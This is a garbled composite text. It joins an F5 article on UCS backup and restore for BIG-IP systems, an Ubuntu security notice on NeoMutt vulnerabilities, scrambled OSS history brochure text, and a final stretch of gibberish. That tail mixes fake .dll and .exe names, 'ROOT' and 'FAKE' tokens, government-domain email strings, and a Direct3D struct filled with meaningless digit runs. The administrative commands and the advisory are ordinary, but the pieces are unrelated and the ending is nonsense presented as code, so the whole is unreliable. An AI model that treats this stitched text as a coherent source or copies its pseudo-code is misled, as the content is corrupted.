The UCS archive is intended to back up and restore the configuration of a specific platform. When you install a UCS archive on a dissimilar platform, you must use either the no-platform-check or platform-migrate options. For more information, refer to K14906: Overview of the UCS 'no-platform-check' tmsh option and K82540512: Overview of the UCS archive 'platform-migrate' option. If you do not use these options, the configuration may fail to load due to the differing hardware components. In the case of a load failure, you need to intervene manually to identify and resolve each error that the system presents when you attempt to load the configuration.
When you replace a device that was previously part of an HA configuration and on which you enabled MAC masquerading, configure the replacement device with the same MAC masquerading address that was on the original device.
Licensing

The BIG-IP license is associated with a specific hardware serial number. The UCS archive contains the license file of the system on which you saved the configuration. To successfully install a UCS archive file on a BIG-IP system, you must perform one of the following actions:

Restore the UCS archive to the same system from which you saved it.
Relicense the BIG-IP system after you restore the UCS archive. You must do this when restoring the UCS archive to a system that was replaced due to a Return Material Authorization (RMA) in order to associate the license to the new serial number.
Note: You are allowed to associate the license to a new serial number only in the event of an RMA.

Save the license file prior to restoring the configuration from another system, and then copy the license file back.
Use the following syntax to install the UCS archive using the no-license option:
tmsh load /sys ucs <path/to/UCS> no-license

For example, you use the following code to install the UCS archive named MyUCS:

tmsh load /sys ucs /var/tmp/MyUCS.ucs no-license

Important: If you use a different license than the one a restored UCS archive contains, the replacement license must include authorization for the same options and add-on modules, such as BIG-IP APM or BIG-IP ASM. If you attempt to restore a UCS configuration referencing an unlicensed module, the BIG-IP system does not properly restore the UCS archive. Additionally, the BIG-IP system reports a Provisioning Warning message in the Configuration utility, as well as the status of ModuleNotLicensed in its command-line prompt.

UCS files

If necessary, copy the UCS archive file you want to restore to the BIG-IP file system.

Host name and base configuration

The UCS restore operation restores the full configuration to the target system, including the host name and the base configuration.

Note: This behavior is a change from previous versions of the BIG-IP system.

BIG-IP configuration objects with passphrases

If you are restoring on a new system, the new system cannot decrypt a UCS archive that includes encrypted passphrases. This format is an intentional security measure.

When you replace one system of a failover pair, F5 recommends that you configure basic networking on the replacement unit and then synchronize the configuration from its peer, instead of restoring the configuration by installing the UCS archive. Because the master key is shared between units of a redundant pair, the configuration synchronization process synchronizes the original master key to the newly installed device. For more information, refer to K13551: Configuring a replacement BIG-IP device after an RMA when no UCS archive is available. If you cannot synchronize the original master key to the new system from its peer, but you know the original unencrypted passphrases, you can install the UCS file to restore the configuration, modify the affected configuration objects to replace the encrypted passphrases with unencrypted versions, and save the resulting configuration.

Note: When you replace a standalone system or replace all of the redundant systems which are no longer operational, you may be required to use passwords or passphrases to restore a UCS archive. It is strongly recommended to store passwords or passphrases in a safe and accessible place.

If you are restoring a backup that contains encrypted passphrases and the device cannot decrypt the encrypted passphrases for objects used in the configuration for example if the device is a replacement and does not have the same master key, an error message displays that appears similar to the following example:

0107102b:3: Master Key decrypt failure - decrypt failure - final

If you receive this error message when installing the UCS archive, refer to the following articles:

K9420: Installing UCS files containing encrypted passwords or passphrases (11.5.x and later)
K13508: ConfigSync operations fail to complete and generate a validation message
BIG-IP DNS considerations

If you want to install a UCS archive on a BIG-IP DNS (formerly known as BIG-IP GTM) system, such as an RMA replacement, and prevent the system from synchronizing the contents of the UCS archive to the DNS synchronization group, refer to K14083: Preventing synchronization when installing a UCS archive on a BIG-IP DNS system.

For a BIG-IP DNS or GTM RMA unit that is licensed and provisioned with the BIG-IP GTM module and the Domain Name System Security Extensions (DNSSEC) feature, refer to K13542: Restoring DNSSEC or password protected configuration data to a BIG-IP GTM or BIG-IP DNS RMA unit.

BIG-IP ASM considerations

In BIG-IP 11.0.0 through BIG-IP 11.2.1, if you are restoring a UCS file that is licensed and provisioned with the BIG-IP ASM module, you may need to provision the system for BIG-IP ASM before loading the UCS file.

DSC considerations

If you are restoring a UCS file on a BIG-IP unit that is part of a device group, refer to K8086: Replacing a BIG-IP system in a redundant pair without interrupting service.

When you restore a UCS file on a BIG-IP device that is part of a device group and you enable Automatic Sync, the UCS configuration synchronizes to the other device group members. This action may be unwanted if the UCS file contains an older configuration and you do not want to overwrite the configuration of the device group members. To avoid this situation, you can perform the following tasks prior to installing the UCS file:

Disconnect the interfaces on the device on which you are restoring the UCS file.
Restore the UCS file on the device.
Make a change on the peer device with the configuration you want to use.
Note: This step ensures that the correct device initiates the automatic ConfigSync operation.

Reconnect the interfaces on the device on which you restored the UCS file.
vCMP considerations

For a Virtual Clustered Multiprocessing (vCMP) host, the UCS configuration archive contains only the necessary files that the system requires to restore the vCMP host configuration but does not include the vCMP guest virtual disk.

For a vCMP guest, the UCS configuration archive contains all of the files that are specific to the vCMP guest, including the configuration files, local user accounts, and SSL certificate and key pairs.

When you restore a vCMP host UCS archive on an appropriate vCMP host, the vCMP host automatically attempts to restore the vCMP guest to a base state by performing the vCMP guest provisioning, installation, and deployment. After the host restores the vCMP guest to a base state, you can restore the vCMP guest by installing the wanted UCS archive that you previously took from a vCMP guest. When you restore a UCS archive to a vCMP guest, it is subject to all of the restrictions and considerations described in the previous sections of this article.

If the vCMP guest software version is different than the version used to create the guest UCS archive, refer to the following articles:

K04260815: Updating 'initial-image' and 'initial-hotfix' settings for vCMP guests
K39404920: vCMP Guest ''Waiting for ISO image to become available'' message, due to software version mismatch in ''initial image'' settings.
F5 BIG-IP SSL Orchestrator considerations

BIG-IP SSL Orchestrator utilizes a separate configuration database called REST Storage. This database stores information about BIG-IP SSL Orchestrator objects and enables it to keep track of configuration changes to TMOS's MCP database and act accordingly. The operation to back up this database to a UCS is a REST call, so the database and service workers must be running to collect this information in a UCS backup. To verify the status of or start rest services, the following procedure is available:

Impact of procedure: The restjavad and restnoded are control-plane processes that are used by various parts of BIG-IP's TMUI web admin interface. Restarting them has no impact to production traffic.

Log in to the BIG-IP command line.
To verify the restjavad and restnoded services are running, type the following command:

tmsh show /sys service restjavad restnoded
 

You should see output similar to:

restjavad         run (pid 3433) 34 minutes, 1 start
restnoded         run (pid 3431) 34 minutes, 1 start
 

If both services show run, REST services are available and you can stop here. If they are down, type the following command:

tmsh start /sys service restjavad restnoded
 

Repeat from step 2.

Procedures

Configuration utility

For a brief demonstration of the procedures for Backing up your BIG-IP configuration files with a UCS archive using the Configuration utility, watch the following video:



For a brief demonstration of the procedures for Restoring your BIG-IP configuration files with a UCS archive using the Configuration utility, watch the following video:



Command line

For a brief demonstration of the procedures for Backing up your BIG-IP configuration files with a UCS archive using the command line, watch the following video:



For a brief demonstration of the procedures for Restoring your BIG-IP configuration files with a UCS archive using the command line, watch the following video:



To back up or restore your BIG-IP configuration, perform the following procedures:

Back up your BIG-IP system configuration
Restore your BIG-IP system configuration
Back up your BIG-IP system configuration

Back up configuration data using the Configuration utility
Back up configuration data using tmsh
Back up configuration data by using the Configuration utility

Impact of procedure: Performing the following procedure should not have a negative impact on your system.

Log in to the Configuration utility.
Go to System > Archives.
To initiate the process of creating a new UCS archive, select Create.
In the File Name box, enter a name for the file.
Important: You must use a unique file name. If a file with the same name already exists, the system does not create the UCS archive file and displays a warning message that appears similar to the following example: The file already exists on the system

Optional: If you want to encrypt the UCS archive file, for Encryption, select Enabled and enter a passphrase. You must supply the passphrase to restore the encrypted UCS archive file.
Optional: If you want to exclude SSL private keys from the UCS archive, for Private Keys, select Exclude. For example, exclude the private keys if you are sending the UCS to F5 Support.
To create the UCS archive file, select Finished.
When the system completes the backup process, examine the status page for any reported errors before proceeding to the next step.
To return to the Archive List page, select OK.
Copy the .ucs file to another system.
Back up configuration data using tmsh

Impact of procedure: Performing the following procedure should not have a negative impact on your system.

Log in to tmsh by entering the following command:
tmsh

Create the UCS archive file by using the following command syntax, replacing <path/to/UCS> with the full path to the UCS archive file:
save /sys ucs <path/to/UCS>

For example:

save /sys ucs /var/tmp/MyUCS.ucs

Optional: You can encrypt the UCS archive with a passphrase by using the following command syntax, replacing <path/to/UCS> with the full path to the UCS archive file and replacing <password> with the passphrase you want to use to encrypt the UCS archive:
save /sys ucs <path/to/UCS> passphrase <password>

For example:

save /sys ucs /var/tmp/MyUCS.ucs passphrase password

Optional: You can exclude SSL private keys from the UCS archive. For example, exclude the private keys if you are sending the UCS to F5 Support. To do so, use the following command syntax, replacing <path/to/UCS> with the full path to the UCS archive file:
save /sys ucs <path/to/UCS> no-private-key

For example:

save /sys ucs /var/tmp/MyUCS.ucs no-private-key

Copy the .ucs file to another system.
Restore your BIG-IP system configuration

Note: Under certain conditions, the BIG-IP system may become unresponsive to ICMP echo requests on self IP addresses. If you encounter this issue, F5 recommends restarting your device.

Restore configuration data using the Configuration utility
Restore configuration data from the command line using tmsh
Restore configuration data on a replacement RMA unit
Restore UCS archives on BIG-IP systems running later software versions
Restore the cluster-specific configuration from a UCS archives created on BIG-IP 11.4.0 and later
Restore the cluster-specific configuration from a UCS archive
Restore configuration data using the Configuration utility

Impact of procedure: The BIG-IP system replaces any existing configuration with the UCS archive file configuration. Specific system services restart, and the device may temporarily lose network failover connectivity if it is a member of a device group. F5 recommends that you perform this procedure during a maintenance window and when the system is a member of a device group when it is in the standby state.

If you are restoring a UCS archive on a BIG-IP 6400, 6800, 8400, or 8800 hardware platform, and it is not the system from which you created the backup, such as when you are replacing an RMA system, you must perform the procedure in the Restoring configuration data from the command line by using tmsh section of this article to restore the configuration.

To restore a configuration in a UCS archive using the Configuration utility, review the considerations described in the Considerations for restoring configuration data section of this article before performing the following procedure:

Log in to the Configuration utility.
Go to System > Archives.
Select the UCS archive you want to restore.
If the UCS archive is encrypted, enter the passphrase for the encrypted UCS archive file for Restore Passphrase. If the UCS archive is not encrypted, you can skip this step.
To initiate the UCS archive restore process, select Restore.
When the system completes the restore process, examine the status page for any reported errors before proceeding to the next step.
To return to the Archive List page, select OK.
If you restored the UCS archive on a different device and received the errors noted in the Considerations for restoring configuration data section of this article, you must reactivate the BIG-IP system license.
After relicensing the system, restart the system to ensure that the configuration is fully loaded. To restart the system, go to System > Configuration, and then select Reboot.
If the system you restored contains the FIPS 140 hardware security module (HSM), you must configure the FIPS 140 HSM Security World after completing steps 1 through 9. For more information about recovering FIPS information after a system recovery, refer to the Configuring and Maintaining a FIPS Security Domain chapter of the Platform Guide for your FIPS BIG-IP platform.
Note: For information about how to locate F5 product manuals, refer to K98133564: Tips for searching AskF5 and finding product documentation.

Restore configuration data from the command line using tmsh

Impact of procedure: The BIG-IP system replaces any existing configuration with the UCS archive file configuration. Specific system services restart, and the device may temporarily lose network failover connectivity if it is a member of a device group. F5 recommends that you perform this procedure during a maintenance window and when the system is a member of a device group when it is in the standby state.

Log in to tmsh by entering the following command:
tmsh

Restore the UCS archive file by using the following command syntax, replacing <path/to/UCS> with the full path of the UCS archive file you want to restore:
load /sys ucs <path/to/UCS>

If you don't specify the path, the BIG-IP system performs as if the UCS archive file is located in the default /var/local/ucs directory.

If you encrypted the UCS archive file with a passphrase during the backup, the system prompts you to enter the passphrase for the archive file.
If you installed the UCS archive on the same device on which you created the backup, the system loads the restored configuration. If you restored the backup on a different device and encounter errors, review the Considerations for restoring configuration data section of this article.
If the system you restored contains the FIPS 140 HSM, you must configure the FIPS 140 HSM Security World after completing steps 1 through 5. For more information about recovering FIPS information after a system recovery, refer to the Configuring and Maintaining a FIPS Security Domain chapter of the Platform Guide for your FIPS BIG-IP platform.
Note: For information about how to locate F5 product manuals, refer to K98133564: Tips for searching AskF5 and finding product documentation.

Restore configuration data on a replacement RMA unit

F5 recommends that you use the following procedure when you restore the archive on a different device than the system on which the backup was created, such as an RMA system. If you do not use this procedure when restoring the archive on a different device, the configuration load may fail and the mcpd process generates an error message that appears similar to the following example to both stdout and the /var/log/ltm file:

mcpd[2395]: 01070608:0: License is not operational(expired or digital signature does not match contents)

F5 expects this message, and you can correct the issue by re-licensing the system, which is discussed later in the procedure.

Impact of procedure: The BIG-IP system replaces any existing configuration with the UCS archive file configuration.

Activate the license on the unit according to the steps detailed in K7752: Licensing the BIG-IP system.
Log in to tmsh by entering the following command:
tmsh

Manually copy the UCS archive file to the target system.
Restore the UCS archive file by using the following command syntax, replacing <path/to/UCS> with the full path of the UCS archive file you want to restore:
load /sys ucs <path/to/UCS> no-license

If you do not specify the path, the BIG-IP system performs as if the UCS archive file is located in the default /var/local/ucs directory.

If you encrypted the UCS archive file with a passphrase during the backup, the system prompts you to enter the passphrase for the archive file.
If the system you restored contains the FIPS 140 HSM, you must configure the FIPS 140 HSM Security World after completing steps 1 through 5. For more information about recovering FIPS information after a system recovery, refer to the Configuring and Maintaining a FIPS Security Domain chapter of the Platform Guide for your FIPS BIG-IP platform.
Note: For information about how to locate F5 product manuals, refer to K98133564: Tips for searching AskF5 and finding product documentation.

Restore UCS archives on BIG-IP systems running later software versions

Impact of procedure: The BIG-IP system replaces any existing configuration with the UCS archive file configuration. Specific system services restart, and the device may temporarily lose network failover connectivity if it is a member of a device group. F5 recommends that you perform this procedure during a maintenance window and when the system is a member of a device group when it is in the standby state.

F5 recommends that you run the same version of the BIG-IP software on the target BIG-IP system that you used on the system you backed up. However, in some cases, you can restore a UCS archive that you obtained from an earlier software version on a target BIG-IP system running a later software version. For example, if you saved a UCS archive on a system running BIG-IP 12.1.3 you can restore the BIG-IP 12.1.3 archive file on a BIG-IP system running BIG-IP 14.x. To restore a UCS archive on a BIG-IP system running a later software version, perform the following procedure:

Verify that a supported upgrade path exists between the software version from which the UCS archive was obtained and the software version running on the target system.
For example, there is a supported upgrade path between BIG-IP 12.x and BIG-IP 14.x. As a result, you can successfully restore a BIG-IP 12.x UCS archive file on a system running BIG-IP 14.x. However, there is not a supported upgrade path between BIG-IP 11.x and BIG-IP 14.x. As a result, you cannot restore a BIG-IP 11.x UCS archive file on a system running BIG-IP 14.x.

For information about supported upgrade paths, refer to K13845: Overview of supported BIG-IP upgrade paths and an upgrade planning reference.

Review the previous Considerations for restoring configuration data section.
Manually copy the UCS archive file to the /var/local/ucs/ directory on the target system.
Restore the UCS archive on the BIG-IP system:
If you are restoring the archive on a device that is different from the one on which the backup was created, follow the Restoring configuration data on a replacement RMA unit procedure.
If you are restoring the archive on the same system on which you created the backup, follow the Restoring configuration data from the command line by using tmsh procedure.
Restore the cluster-specific configuration from a UCS archive created on BIG-IP 11.4.0 and later

Starting in BIG-IP 11.4.0 for VIPRION platforms, tmsh has a command option, include-chassis-level-config, that loads the cluster data (/shared/db/cluster.* files) from a UCS archive created on a BIG-IP 11.4.0 or later system. The command restores the UCS configuration, as well as the chassis cluster configuration, to the new blade installed in the original chassis.

Restore the cluster-specific configuration from a UCS archive

For UCS archives created on BIG-IP 11.4.0 or later, you can load the cluster configuration from the UCS archive using tmsh.

Impact of procedure: The BIG-IP system replaces any existing configuration with the UCS archive file configuration. Specific system services restart, and the device may temporarily lose network failover connectivity if it is a member of a device group. F5 recommends that you perform this procedure during a maintenance window and when the system is a member of a device group when it is in the standby state.

Log in to tmsh by entering the following command:
tmsh

Manually copy the UCS archive file to the /var/local/ucs/ directory on the primary blade.
Load the UCS archive on to the primary blade using the following command syntax:
load sys ucs <ucs name> include-chassis-level-config

Note: The configuration you load from the UCS archive synchronizes across all other blades in the chassis.

If you encrypted the UCS archive file with a passphrase during the backup, the system prompts you to enter the passphrase for the archive file.
If you installed the UCS archive on the same device on which you created the backup, the system loads the restored configuration. If you restored the backup on a different device and encounter errors, review the Considerations for restoring configuration data section of this article.
If the system you restored contains the FIPS 140 HSM, you must configure the FIPS 140 HSM Security World after completing steps 1 through 5. For more information about recovering FIPS information after a system recovery, refer to the Configuring and Maintaining a FIPS Security Domain chapter of the Platform Guide for your FIPS BIG-IP platform.
Note: For information about how to locate F5 product manuals, refer to K98133564: Tips for searching AskF5 and finding product documentation.

Related Content
F5 iApp Automated Backup
K13551: Configuring a replacement BIG-IP device after an RMA when no UCS archive is available
K13294: Installing a UCS configuration archive now restores the full configuration
K3759: Synchronizing SSH keys between the BIG-IP host system and the SCCP
K4423: Overview of UCS archives
K10245: BIG-IP UCS installation and licensing behavior
K13408: Overview of single configuration files (11.x - 17.x)
K17329: BIG-IP GTM name has changed to BIG-IP DNS
Traffic Management Shell (tmsh) Reference Guide
Note: For information about how to locate F5 product manuals, refer to K98133564: Tips for searching AskF5 and finding product documentation.

AI Recommended Content
Policy - K5903: BIG-IP software support policy
Policy - K4309: F5 hardware product lifecycle support policy
Security Advisory - K000149288: libssh vulnerabilities CVE-2019-3859 and CVE-2019-3860
Knowledge - K9476: The F5 hardware/software compatibility matrix
F5 support engineers who work directly with customers write Support Solution and Knowledge articles, which give you immediate access to mitigation, workaround, or troubleshooting suggestions.

Return to Top


Live chat:AskF5
Secure and Deliver Extraordinary Digital Experiences
F5’s portfolio of automation, security, performance, and insight capabilities empowers our customers to create, secure, and operate adaptive applications that reduce costs, improve operations, and better protect users. Learn more ›
What We Offer
Free Trials
Products
Solutions
Resources
White Papers
Glossary
Customer Stories
Webinars
Free Online Courses
F5 Certification
LearnF5 Training
Support
Support Portal
Subscriptions
Knowledge Base
Support Cases
Downloads
Professional Services
Email Preferences
[+]  Leave Feedback
Partners
Find a Reseller Partner
Technology Alliances
Become an F5 Partner
Login to Partner Central
Company
Contact Info
F5 Trust Center
Careers
Diversity & Inclusion
Investor Relations
Blog
Events
Newsroom
F5 NGINX
Connect with us
Connect with F5 on XConnect with F5 on LinkedInConnect with F5 on FacebookConnect with F5 on InstagramConnect with F5 on YouTubeConnect with F5 on DevCentral
Contact Support
F5 Logo © 2025 F5, Inc. All Rights Reserved
TrademarksPoliciesPrivacyCalifornia PrivacyDo Not Sell My Personal Information
Cookie Voorkeursinstellingen
Opens in a modal window
* Add a good commit message at the bottom of the page (<80 characters; use the extended description field for more detail).


'==========================================================================
Ubuntu Security Notice USN-7204-1
January 15, 2025

neomutt vulnerabilities
==========================================================================

A security issue affects these releases of Ubuntu and its derivatives:

- Ubuntu 24.04 LTS
- Ubuntu 22.04 LTS
- Ubuntu 20.04 LTS
- Ubuntu 18.04 LTS

Summary:

Several security issues were fixed in NeoMutt.

Software Description:
- neomutt: command line mail reader based on Mutt, with added features

Details:

Jeriko One discovered that NeoMutt incorrectly handled certain IMAP
and POP3 responses. An attacker could possibly use this issue to
cause NeoMutt to crash, resulting in a denial of service, or
the execution of arbitrary code. This issue only affected
Ubuntu 18.04 LTS. (CVE-2018-14349, CVE-2018-14350, CVE-2018-14351,
CVE-2018-14352, CVE-2018-14353, CVE-2018-14354, CVE-2018-14355,
CVE-2018-14356, CVE-2018-14357, CVE-2018-14358, CVE-2018-14359,
CVE-2018-14362)

Jeriko One discovered that NeoMutt incorrectly handled certain
NNTP-related operations. An attacker could possibly use this issue
to cause NeoMutt to crash, resulting in denial of service, or
the execution of arbitrary code. This issue only affected
Ubuntu 18.04 LTS. (CVE-2018-14360, CVE-2018-14361, CVE-2018-14363)

It was discovered that NeoMutt incorrectly processed additional data
when communicating with mail servers. An attacker could possibly use
this issue to access senstive information. This issue only affected
Ubuntu 18.04 LTS and Ubuntu 20.04 LTS. (CVE-2020-14954, CVE-2020-28896)

It was discovered that Neomutt incorrectly handled the IMAP QRSync
setting. An attacker could possibly use this issue to cause NeoMutt
to crash, resulting in denial of service. This issue only affected
Ubuntu 20.04 LTS. (CVE-2021-32055)

Tavis Ormandy discovered that NeoMutt incorrectly parsed uuencoded
text past the length of the string. An attacker could possibly use
this issue to enable the execution of arbitrary code. This issue
only affected Ubuntu 18.04 LTS, Ubuntu 20.04 LTS, and
Ubuntu 22.04 LTS. (CVE-2022-1328)

It was discovered that NeoMutt did not properly encrypt email headers.
An attacker could possibly use this issue to receive emails that were
not intended for them and access sensitive information. This
vulnerability was only fixed in Ubuntu 20.04 LTS, Ubuntu 22.04 LTS,
and Ubuntu 24.04 LTS. (CVE-2024-49393, CVE-2024-49394)

Update instructions:

The problem can be corrected by updating your system to the following
package versions:

Ubuntu 24.04 LTS
neomutt 20231103+dfsg1-1ubuntu0.1~esm1
Available with Ubuntu Pro

Ubuntu 22.04 LTS
neomutt 20211029+dfsg1-1ubuntu0.1~esm1
Available with Ubuntu Pro

Ubuntu 20.04 LTS
neomutt 20191207+dfsg.1-1.1ubuntu0.1~esm1
Available with Ubuntu Pro

Ubuntu 18.04 LTS
neomutt 20171215+dfsg.1-1ubuntu0.1~esm1
Available with Ubuntu Pro

In general, a standard system update will make all the necessary changes.

References:
https://ubuntu.com/security/notices/USN-7204-1
CVE-2018-14349, CVE-2018-14350, CVE-2018-14351, CVE-2018-14352,
CVE-2018-14353, CVE-2018-14354, CVE-2018-14355, CVE-2018-14356,
CVE-2018-14357, CVE-2018-14358, CVE-2018-14359, CVE-2018-14360,
CVE-2018-14361, CVE-2018-14362, CVE-2018-14363, CVE-2020-14954,
CVE-2020-28896, CVE-2021-32055, CVE-2022-1328, CVE-2024-49393,
CVE-2024-49394
'
* Create a new branch so you can preview your new file and request a review via Pull Request.
:{ALLEN W.
DULLES
Allen Dulles behind his desk in Bern, Switzerland. Bern Station showed just how much
OSS could accomplish in the realm
of espionage. The station produced a
remarkable stream of intelligence about Nazi
Germany in addition to orchestrating a major
covert action.
Bern’s success would have been inconceivable
without the leadership of its chief, Allen W.
Dulles, a man with
a keen sense of
opportunity and the
ability to find and
make friends in all the
right places. Starting
virtually from scratch,
with a handful of
employees and little
support of any kind,
he built a network of contacts and established
himself as the man to see to pass secrets to
the United States.
One of his prize contacts was Fritz Kolbe, a
A REMARKABLE WARTIME RECORD
Allies’ single best human source on German
plans and intentions. Another prize contact
was Hans Bernd Gisevius, a renegade German
intelligence officer assigned to Switzerland who
kept Dulles abreast of political developments
inside the Reich. In the waning weeks of
the war, Dulles embarked on a series of
negotiations with SS General Karl Wolff and,
with Washington’s approval, engineered an
early surrender of Axis
forces in Italy. “When the fate of a nation and
the lives of its soldiers are at Dulles’s wartime record stood him in good
stake, gentlemen do read each stead and confirmed
other’s mail.” his predilection for
intelligence work.
—Allen Dulles Although he returned to
his law practice in New
York after the war, he could not resist the lure
of secret service and joined CIA in 1951. Two
years later, he became DCI and served in that
position until 1961.
German anti-Nazi with direct access to German
Foreign Office traffic, who brought documents
to Switzerland. This made him the Western
OSS identification card of
Allen Dulles.
20 21
BEHIND JAPANESE LINES
OSS IN ASIA
“Working in very small groups made it easier to
keep a low profile. Cultivating the confidence of
the people in the field, treating their sick, supplying
their needs, pressing them into service, and sending
them to gather all types of information were
essential to our mission.”
—Harry “Skittles” Hengshoon,
a civilian with Detachment 101, on its work to recruit
and train Burmese forces to fight the Japanese.
FAR LEFT: Posting the latest TOP: Personnel in the China- LOWER LEFT: Detachment
news at Kyaukpyu Camp, Burma-India Theater wore this 101 officers display their
Burma. patch on their left sleeves. machine guns in Burma.
From 1942 to 1945, Detachment 101 was one of the few OSS units
to operate in Asia. With never more than 120 Americans on the
ground, the unit recruited and trained thousands of indigenous
fighters to operate behind the Japanese lines in Burma, where they
gathered tactical intelligence, rescued downed fliers, and attacked the
enemy when and where he was vulnerable. At the end of the war,
the detachment received a well-deserved
LOWER RIGHT: The OSS
Gallery’s “In the Field” section.
Presidential Unit Citation.
Other OSS detachments operated in China
and Thailand. While the mission in China was
to fight the Japanese, OSS had to overcome
numerous practical and political obstacles
before it could collect intelligence and train
guerrillas. Thailand was technically allied
with the Japanese but home to a resistance
movement with the potential to stage an
uprising against the Japanese. Promising
arms and training, OSS officers nurtured
contacts with the Free Thai under the noses
of Japanese occupiers.
When the Japanese surrendered, OSS detachments played an important
role in saving the lives of thousands of Allied prisoners of war by
parachuting into their camps, keeping them safe from rogue Japanese,
and arranging for medical care and evacuation.
22 23
CATCH OF THE DAY
MARITIME OPERATIONS
“A special weapon of the saboteur is the ‘Limpet,’
named after a shellfish which adheres to rocks. By
means of a magnet or rivets, the Limpet anchors to
a ship below the waterline....Although the hole it
opens in the side of the ship is small, the result is
devastating.”
—Stanley P. Lovell
The OSS Maritime Unit conducted numerous coastal sabotage
operations, such as detonating limpet mines for ships (A),
and worked to develop equipment like “GIMIK” (B), a
semisubmersible that was never used operationally. GIMIK was
the inspiration for a later CIA semisubmersible called SKIFF.
A
B
LEFT: The OSS Maritime Unit combat swimmers used this US RIGHT: Display of the American Lambertsen Diving Unit that
Army Corps of Engineers compass during clandestine ferrying OSS deployed.
and coastal sabotage operations.
The growing number of OSS coastal infiltration and sabotage projects eventually gave rise
to an independent branch, the Maritime Unit, to develop specialized boats, equipment,
and explosives. The unit fashioned underwater breathing gear, waterproof watches and
compasses, an inflatable motorized surfboard, and a two-man kayak that proved so promising
that the British ordered 275.}:ROOT@google.com,$write_only.pfx
`BENZINALT.dll,pci:CSS:kibo_EXPO-002'Black-Whole-wraith.dll'þ-{(--Starfield.exe Ídtracé-48g940fg98dg04d89h4j98u4iyo4p4i9k8y4t9d8gs4d8f9s48v9ff4ghf89fy4j0g89y078h9fdgrgd098dhf890t4h0fj89.prompt;Printordd@FMA.benzinalt.pbac.bpac.fbi.eu.aaa.gov.list.ru)}:STORYLINE_$INSTALL:#FAKE.prompt$GAME.dll$-lion.king_installer.msi-Storytimes$BUILD.exe

exit ;00000000123399638979961964,#907.dll

BLEND:PENTAFLOPPY;ROLLDEEP:#µ8851846888228888808743.end.refill, -*Respray,__FIRE*FLY=birds_upon_trapwired_$mushrooms_BENZINALT-cop_dla-lgcsavert_INCITRICITIN-,#STIMPIXCITY,-Revocaté
-END



._rapLø-ØJ6øøøø_(secret(service)hosting)materials-CSS@intel.com`XENTRILLION-lgcsavert~06911412~06121994~06199412`

LOG;benzinalt`sentrifuge-LGCSAVERT@dim.mil.gov:øxxx&CLERK%diplo,matric,Caller_ID=ø:FRANKLINJ~06911412'06121994*18459866',³-#903.dll`(typedef struct D3DVIEWPORT9 {
  DWORD X;856048956895648195641896589568958956401895608956408956x9805641895641089564018956401895648956489568956189564189560895608956
  DWORD Y;958956401895608956408956x98056418956410809840189568956895689568956895648956895689560895618956089568956089650895604
  DWORD Width;9589564018956080954198564018956089560198568956408956x9805065186589658965985641895664189564108
  DWORD Height;896540189560895689568956189569856895604189568956408956,nano-micro_Litré osscillation fluid.Ppfx
  float MinZ;$TRUE.dll
  float MaxZ;$true.dll
} D3DVIEWPORT9,$write_only.dll *LPD3DVIEWPORT9;=ROOT_ASTRID_LICHE.dll=!@gpo.gov),master.pfx
,-$flush.exe
